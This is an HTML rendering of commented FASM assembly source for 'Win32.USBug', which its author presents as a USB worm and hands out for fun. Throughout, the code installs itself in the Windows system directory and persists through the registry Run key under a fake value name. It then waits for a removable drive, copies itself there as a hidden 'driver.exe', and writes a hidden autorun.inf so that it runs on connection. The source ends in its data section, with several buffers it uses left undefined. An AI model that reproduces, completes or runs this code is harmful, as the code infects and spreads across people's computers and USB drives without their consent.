<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>USBug.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; Win32.USBug - A simple USB Worm</span><span class="sc0">
</span><span class="sc1">; by DiA/RRLF</span><span class="sc0">
</span><span class="sc1">; http://www.vx-dia.de.vu</span><span class="sc0">
</span><span class="sc1">; DiA_hates_machine@gmx.de</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Alot of comments, pretty much self explaining, have fun with this little fucker.</span><span class="sc0">


</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc3">"%fasminc%\win32ax.inc"</span><span class="sc0">         </span><span class="sc1">;common stuff</span><span class="sc0">

</span><span class="sc9">section</span><span class="sc0"> </span><span class="sc3">"usbug"</span><span class="sc0"> </span><span class="sc5">code</span><span class="sc0"> </span><span class="sc5">readable</span><span class="sc0"> </span><span class="sc5">writeable</span><span class="sc0"> </span><span class="sc5">executable</span><span class="sc0"> </span><span class="sc1">;just one section</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0"> </span><span class="sc5">GetModuleFileName</span><span class="sc4">,</span><span class="sc0">\      </span><span class="sc1">;get our path</span><span class="sc0">
        </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">\             </span><span class="sc1">;this module</span><span class="sc0">
        </span><span class="sc5">OurPath</span><span class="sc4">,</span><span class="sc0">\           </span><span class="sc1">;store it here</span><span class="sc0">
        </span><span class="sc2">256d</span><span class="sc0">                </span><span class="sc1">;size of buffer</span><span class="sc0">

    </span><span class="sc9">invoke</span><span class="sc0"> </span><span class="sc5">GetSystemDirectory</span><span class="sc4">,</span><span class="sc0">\     </span><span class="sc1">;get system directory</span><span class="sc0">
        </span><span class="sc5">SystemDir</span><span class="sc4">,</span><span class="sc0">\         </span><span class="sc1">;buffer</span><span class="sc0">
        </span><span class="sc2">256d</span><span class="sc0">                </span><span class="sc1">;size of buffer</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OurPath</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">5d</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;get a dword of the string in eax (c:\wINDOws\system32\usbug.exe)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SystemDir</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">5d</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;get also a dword in ebx (c:\wINDOws\system32)</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">;check if same</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">GetWatchDrive</span><span class="sc0">            </span><span class="sc1">;then skip installation</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                </span><span class="sc1">;clear counter</span><span class="sc0">

</span><span class="sc5">GetPathEnd</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc1">;get the end of the system path</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SystemDir</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;check for terminating zero</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">HavePathEnd</span><span class="sc0">              </span><span class="sc1">;if so we found end of string</span><span class="sc0">

    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;inc counter</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">GetPathEnd</span><span class="sc0">              </span><span class="sc1">;check next place</span><span class="sc0">

</span><span class="sc5">HavePathEnd</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc1">;append our installation name</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SystemDir</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"\usb"</span><span class="sc0"> </span><span class="sc1">;dword for dword</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SystemDir</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4d</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"ug.e"</span><span class="sc1">;no need for api here</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SystemDir</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8d</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"xe"</span><span class="sc0">   </span><span class="sc1">;now we have full path</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10d</span><span class="sc0">                </span><span class="sc1">;update counter</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                </span><span class="sc1">;save counter to stack</span><span class="sc0">

    </span><span class="sc9">invoke</span><span class="sc0"> </span><span class="sc5">CopyFile</span><span class="sc4">,</span><span class="sc0">\           </span><span class="sc1">;copy to system directory</span><span class="sc0">
        </span><span class="sc5">OurPath</span><span class="sc4">,</span><span class="sc0">\           </span><span class="sc1">;from here</span><span class="sc0">
        </span><span class="sc5">SystemDir</span><span class="sc4">,</span><span class="sc0">\         </span><span class="sc1">;to system directory (contains full path)</span><span class="sc0">
        </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;overwrite if we are already there</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;get counter from stack</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                </span><span class="sc1">;save counter for registry use in ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OurPath</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">;set terminating zero to string, ecx is zero after copying bytes</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SystemDir</span><span class="sc0">          </span><span class="sc1">;source index is system dir buffer, counter is in ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">OurPath</span><span class="sc0">            </span><span class="sc1">;destination is our path buffer</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">               </span><span class="sc1">;move ecx bytes from esi to edi</span><span class="sc0">

    </span><span class="sc9">invoke</span><span class="sc0"> </span><span class="sc5">RegOpenKeyEx</span><span class="sc4">,</span><span class="sc0">\           </span><span class="sc1">;open registry key</span><span class="sc0">
        </span><span class="sc5">HKEY_LOCAL_MACHINE</span><span class="sc4">,</span><span class="sc0">\        </span><span class="sc1">;write in this key</span><span class="sc0">
        </span><span class="sc5">RegRunKey</span><span class="sc4">,</span><span class="sc0">\         </span><span class="sc1">;write to this autostart subkey</span><span class="sc0">
        </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">\             </span><span class="sc1">;reserved</span><span class="sc0">
        </span><span class="sc5">KEY_SET_VALUE</span><span class="sc4">,</span><span class="sc0">\         </span><span class="sc1">;we wanna write a value</span><span class="sc0">
        </span><span class="sc5">RegHandle</span><span class="sc0">           </span><span class="sc1">;save handle here</span><span class="sc0">

    </span><span class="sc9">invoke</span><span class="sc0"> </span><span class="sc5">RegSetValueEx</span><span class="sc4">,</span><span class="sc0">\          </span><span class="sc1">;set our value</span><span class="sc0">
        </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RegHandle</span><span class="sc4">],</span><span class="sc0">\     </span><span class="sc1">;reg handle</span><span class="sc0">
        </span><span class="sc5">RegValueName</span><span class="sc4">,</span><span class="sc0">\          </span><span class="sc1">;the value name, some fake of course</span><span class="sc0">
        </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">\             </span><span class="sc1">;reserved</span><span class="sc0">
        </span><span class="sc5">REG_SZ</span><span class="sc4">,</span><span class="sc0">\            </span><span class="sc1">;its a zero terminated string</span><span class="sc0">
        </span><span class="sc5">OurPath</span><span class="sc4">,</span><span class="sc0">\           </span><span class="sc1">;full path</span><span class="sc0">
        </span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">;size of buffer (ex-counter)</span><span class="sc0">

    </span><span class="sc9">invoke</span><span class="sc0"> </span><span class="sc5">RegCloseKey</span><span class="sc4">,</span><span class="sc0">\            </span><span class="sc1">;close registry</span><span class="sc0">
        </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RegHandle</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;via handle</span><span class="sc0">

</span><span class="sc5">GetWatchDrive</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc1">;get next free drive letter</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0"> </span><span class="sc5">GetLogicalDriveStrings</span><span class="sc4">,</span><span class="sc0">\     </span><span class="sc1">;call API to get all drives as strings in AllDrives</span><span class="sc0">
        </span><span class="sc2">105d</span><span class="sc4">,</span><span class="sc0">\              </span><span class="sc1">;size of buffer (A:\0 = 4 bytes * 26 + terminating 0)</span><span class="sc0">
        </span><span class="sc5">AllDrives</span><span class="sc0">           </span><span class="sc1">;store it here</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">67d</span><span class="sc0">             </span><span class="sc1">;store "C" in bl, thats where we start</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                </span><span class="sc1">;clear counter</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">AllDrives</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">65d</span><span class="sc0">       </span><span class="sc1">;check if we start at A:\
    jne FindWatchDrive          ;if not start checking</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4d</span><span class="sc0">             </span><span class="sc1">;if there is a A:\ skip it</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">AllDrives</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">66d</span><span class="sc0">     </span><span class="sc1">;is there also a B:\
    jne FindWatchDrive          ;no, we are at C:\, start checking</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4d</span><span class="sc0">             </span><span class="sc1">;if there is a B:\ skip this, we are now at C:\
</span><span class="sc0">
</span><span class="sc5">FindWatchDrive</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc1">;find the drive where usb sticks can be plugged</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">AllDrives</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00d</span><span class="sc0">     </span><span class="sc1">;we are at string end? then usb drive is last available + 1</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">FoundEnd</span><span class="sc0">             </span><span class="sc1">;we are at the end</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">AllDrives</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">      </span><span class="sc1">;is there a clean chain like C D E F G ...</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">FoundWatchDrive</span><span class="sc0">         </span><span class="sc1">;no? then we found the usb drive in the middle</span><span class="sc0">

    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">                  </span><span class="sc1">;check next character</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4d</span><span class="sc0">             </span><span class="sc1">;skip C:\0 for example</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">FindWatchDrive</span><span class="sc0">          </span><span class="sc1">;and check next string</span><span class="sc0">

</span><span class="sc5">FoundWatchDrive</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">;usb drive is in the middle</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">AllDrives</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;get drive AFTER the space</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">                  </span><span class="sc1">;dec it, so we have the usb drive</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WatchDrive</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">       </span><span class="sc1">;store it</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">WaitForUsb</span><span class="sc0">              </span><span class="sc1">;skip</span><span class="sc0">

</span><span class="sc5">FoundEnd</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">;lets get last drive from end of string</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4d</span><span class="sc0">             </span><span class="sc1">;set counter to last available drive</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">AllDrives</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;get last available drive letter</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">                  </span><span class="sc1">;inc it, so we have the usb drive</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WatchDrive</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">       </span><span class="sc1">;store it</span><span class="sc0">

</span><span class="sc5">WaitForUsb</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc1">;now lets wait until a usb stick is plugged</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">UsbFile</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"driv"</span><span class="sc0">     </span><span class="sc1">;set filename dword by dword</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">UsbFile</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4d</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"er.e"</span><span class="sc0">    </span><span class="sc1">;no api here too</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">UsbFile</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8d</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"xe"</span><span class="sc0">       </span><span class="sc1">;now we have a full path in WatchDrive</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">UsbFile</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10d</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">;terminating null</span><span class="sc0">

</span><span class="sc5">DropToUsb</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc1">;try to copy ourself on the drive + filename</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0"> </span><span class="sc5">CopyFile</span><span class="sc4">,</span><span class="sc0">\           </span><span class="sc1">;copy file</span><span class="sc0">
        </span><span class="sc5">OurPath</span><span class="sc4">,</span><span class="sc0">\           </span><span class="sc1">;from system directory</span><span class="sc0">
        </span><span class="sc5">WatchDrive</span><span class="sc4">,</span><span class="sc0">\            </span><span class="sc1">;to the possible usb stick (O:\driver.exe as example)</span><span class="sc0">
        </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;overwrite if already exist</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;failure?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">GenerateAutorun</span><span class="sc0">         </span><span class="sc1">;if not a usb is plugged and we can generate the autostart.inf</span><span class="sc0">

    </span><span class="sc9">invoke</span><span class="sc0"> </span><span class="sc5">Sleep</span><span class="sc4">,</span><span class="sc0">\              </span><span class="sc1">;nothing plugged, sleep for 20 seconds</span><span class="sc0">
        </span><span class="sc2">20000d</span><span class="sc0">              </span><span class="sc1">;20sec</span><span class="sc0">

    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">DropToUsb</span><span class="sc0">               </span><span class="sc1">;loop it</span><span class="sc0">

</span><span class="sc5">GenerateAutorun</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">;drive available! usb plugged...</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0"> </span><span class="sc5">SetFileAttributes</span><span class="sc4">,</span><span class="sc0">\      </span><span class="sc1">;hide our program</span><span class="sc0">
        </span><span class="sc5">WatchDrive</span><span class="sc4">,</span><span class="sc0">\            </span><span class="sc1">;full path of it</span><span class="sc0">
        </span><span class="sc5">FILE_ATTRIBUTE_HIDDEN</span><span class="sc0">       </span><span class="sc1">;hidden</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">UsbFile</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"auto"</span><span class="sc0">     </span><span class="sc1">;overwrite our copy path (driver.exe) with "autorun.inf"</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">UsbFile</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4d</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"run."</span><span class="sc0">    </span><span class="sc1">;dword for dword</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">UsbFile</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8d</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"inf"</span><span class="sc0">     </span><span class="sc1">;no lstrcat dude!</span><span class="sc0">

    </span><span class="sc9">invoke</span><span class="sc0"> </span><span class="sc5">CreateFile</span><span class="sc4">,</span><span class="sc0">\         </span><span class="sc1">;now create the autorun.inf</span><span class="sc0">
        </span><span class="sc5">WatchDrive</span><span class="sc4">,</span><span class="sc0">\            </span><span class="sc1">;full path to usb (O:\autorun.inf) for example</span><span class="sc0">
        </span><span class="sc5">GENERIC_WRITE</span><span class="sc4">,</span><span class="sc0">\         </span><span class="sc1">;just write to it</span><span class="sc0">
        </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">\             </span><span class="sc1">;no shared mode</span><span class="sc0">
        </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">\             </span><span class="sc1">;no security attributes</span><span class="sc0">
        </span><span class="sc5">CREATE_ALWAYS</span><span class="sc4">,</span><span class="sc0">\         </span><span class="sc1">;overwrite if exist</span><span class="sc0">
        </span><span class="sc5">FILE_ATTRIBUTE_HIDDEN</span><span class="sc4">,</span><span class="sc0">\     </span><span class="sc1">;create it hidden</span><span class="sc0">
        </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;no template file</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;save file handle in ebx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SystemDir</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"[aut"</span><span class="sc0">       </span><span class="sc1">;prepare the buffer, use already but not used buffer</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SystemDir</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4d</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"orun"</span><span class="sc0">  </span><span class="sc1">;dword for dword</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SystemDir</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8d</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"]"</span><span class="sc0">     </span><span class="sc1">;finished first line</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SystemDir</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">9d</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">13d</span><span class="sc0">      </span><span class="sc1">;linebreak</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SystemDir</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10d</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">10d</span><span class="sc0">     </span><span class="sc1">;13, 10</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SystemDir</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">11d</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"open"</span><span class="sc0"> </span><span class="sc1">;open our program on connect</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SystemDir</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">15d</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"=dri"</span><span class="sc0"> </span><span class="sc1">;driver.exe</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SystemDir</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">19d</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"ver."</span><span class="sc0"> </span><span class="sc1">;lstrcat my ass</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SystemDir</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">23d</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"exe"</span><span class="sc0">  </span><span class="sc1">;"exe" + terminating zero</span><span class="sc0">

    </span><span class="sc9">invoke</span><span class="sc0"> </span><span class="sc5">WriteFile</span><span class="sc4">,</span><span class="sc0">\          </span><span class="sc1">;write buffer to file</span><span class="sc0">
        </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0">\               </span><span class="sc1">;file handle</span><span class="sc0">
        </span><span class="sc5">SystemDir</span><span class="sc4">,</span><span class="sc0">\         </span><span class="sc1">;the buffer with the autostart.inf content</span><span class="sc0">
        </span><span class="sc2">26d</span><span class="sc4">,</span><span class="sc0">\               </span><span class="sc1">;number of bytes to write</span><span class="sc0">
        </span><span class="sc5">RegHandle</span><span class="sc4">,</span><span class="sc0">\         </span><span class="sc1">;put number of written bytes to nowhere</span><span class="sc0">
        </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;no overlapped</span><span class="sc0">

    </span><span class="sc9">invoke</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc4">,</span><span class="sc0">\            </span><span class="sc1">;close file</span><span class="sc0">
        </span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">;via handle</span><span class="sc0">

    </span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">;ExitProcess for poor people</span><span class="sc0">

</span><span class="sc5">Datas</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">;here are the needed datas</span><span class="sc0">
    </span><span class="sc5">Copyleft</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"USBug - DiA/RRLF"</span><span class="sc0">   </span><span class="sc1">;bow!</span><span class="sc0">
    </span><span class="sc5">OurPath</span><span class="sc0">     </span><span class="sc5">rb</span><span class="sc0"> </span><span class="sc2">256d</span><span class="sc0">         </span><span class="sc1">;here we store the path of this program</span><span class="sc0">
    </span><span class="sc5">SystemDir</span><span class="sc0">   </span><span class="sc5">rb</span><span class="sc0"> </span><span class="sc2">256d</span><span class="sc0">         </span><span class="sc1">;buffer for system directory</span><span class="sc0">
    </span><span class="sc5">RegRunKey</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;reg autostart</span><span class="sc0">
    </span><span class="sc5">RegHandle</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">            </span><span class="sc1">;store reg handle here</span><span class="sc0">
